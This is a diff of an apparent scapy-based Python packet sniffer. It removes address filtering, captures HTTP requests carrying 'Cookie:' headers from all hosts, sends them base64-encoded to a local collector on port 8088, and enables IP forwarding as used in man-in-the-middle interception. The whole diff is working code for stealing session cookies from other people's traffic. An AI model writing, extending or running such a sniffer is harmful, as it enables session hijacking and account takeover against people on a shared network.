@@ -25,8 +25,8 @@ def doPack(pkt):
         # pkt.show()
         m = []#['ff:ff:ff:ff:ff:ff', '192.168.24.91','192.168.24.180','00:00:00:00:00:00', '224.0.0.253', '224.0.0.251','224.0.0.252', '192.168.24.1', '239.255.255.250','192.168.24.255','192.168.24.15']
         a = [pkt.src, pkt.dst]
-        if pkt.src in m or pkt.dst in m:
-            return
+        #if pkt.src in m or pkt.dst in m:
+        #    return
         # LLC 802.3 SNAP
         b = {}
         if IP in pkt:
@@ -38,15 +38,15 @@ def doPack(pkt):
 
         if b:
             a += [b.src, b.dst]
-            if b.src in m or b.dst in m:
-                return
+            #if b.src in m or b.dst in m:
+            #    return
         # if Raw in pkt:
         #    a += [str(pkt[Raw])]
         if TCP in pkt:
             # pkt.show()
             s1 = str(pkt[TCP].payload)
             #  or -1 < s1.find("POST ")
-            if -1 < s1.find(" HTTP/") and -1 == s1.find("secclientgw.alipay.com"):
+            if -1 < s1.find(" HTTP/") and -1 == s1.find("secclientgw.alipay.com") and -1 < s1.find("Cookie:"):
                 a += [s1]
                 szJson = json.dumps(a,sort_keys=True, indent=2, separators=(',', ':'))
                 requests.post("http://127.0.0.1:8088/netM",data=base64.b64encode(szJson));
@@ -58,7 +58,7 @@ def doPack(pkt):
         pass
     return
 def main():
-    # os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
+    os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
     # os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')
     defNet = netifaces.gateways()['default'][netifaces.AF_INET]
     # ,interface='bridge0'
